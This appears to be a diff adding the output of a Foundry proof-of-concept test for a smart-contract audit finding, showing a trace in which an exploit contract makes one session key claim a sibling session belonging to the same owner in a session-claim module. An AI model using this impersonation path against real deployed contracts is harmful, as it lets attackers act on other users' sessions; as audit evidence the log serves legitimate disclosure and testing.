@@ -1,0 +1,57 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/62848-h-01-sessionkey-owner-impersonate-session-key-owner_exp.sol:PoC_62848
+[PASS] test_session_key_can_consume_sibling_session() (gas: 838593)
+Traces:
+  [838593] PoC_62848::test_session_key_can_consume_sibling_session()
+    ├─ [714248] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [301941] → new SessionClaimModule@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1508 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 1787 bytes of code
+    ├─ [78134] Exploit::run()
+    │   ├─ [22898] SessionClaimModule::enable(0x0000000000000000000000000000000000001001, 0x000000000000000000000000000000000000bEEF)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc6bff8329dbd7c23f5809bf0db423c69def1438b64036876dcbb4dfb8ae124f8: 0 → 48879
+    │   │   └─ ← [Stop]
+    │   ├─ [22898] SessionClaimModule::enable(0x0000000000000000000000000000000000001002, 0x000000000000000000000000000000000000bEEF)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa1d53959f4f314351a3dcb63f64f33981c99e4a5a996a333959a76bee9d8fbda: 0 → 48879
+    │   │   └─ ← [Stop]
+    │   ├─ [23636] SessionClaimModule::claim(0x0000000000000000000000000000000000001002, 0x0000000000000000000000000000000000001001, 0x000000000000000000000000000000000000bEEF)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf04c2c5f6f9b62a2b5225d778c263b65e9f9e981a3c2cee9583d90b6a62a361c: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [855] SessionClaimModule::claimed(0x0000000000000000000000000000000000001001) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [2855] SessionClaimModule::claimed(0x0000000000000000000000000000000000001002) [staticcall]
+    │   │   └─ ← [Return] false
+    │   ├─  storage changes:
+    │   │   @ 0: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00 → 0x000000000000000000000001104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Stop]
+    ├─ [538] Exploit::impersonated() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [725] Exploit::module() [staticcall]
+    │   └─ ← [Return] SessionClaimModule: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [351] Exploit::SESSION_ONE() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000001001
+    ├─ [855] SessionClaimModule::claimed(0x0000000000000000000000000000000000001001) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [725] Exploit::module() [staticcall]
+    │   └─ ← [Return] SessionClaimModule: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [461] Exploit::SESSION_TWO() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000001002
+    ├─ [855] SessionClaimModule::claimed(0x0000000000000000000000000000000000001002) [staticcall]
+    │   └─ ← [Return] false
+    ├─ [0] VM::assertFalse(false) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 854.88µs (549.92µs CPU time)
+
+Ran 1 test suite in 25.36ms (854.88µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
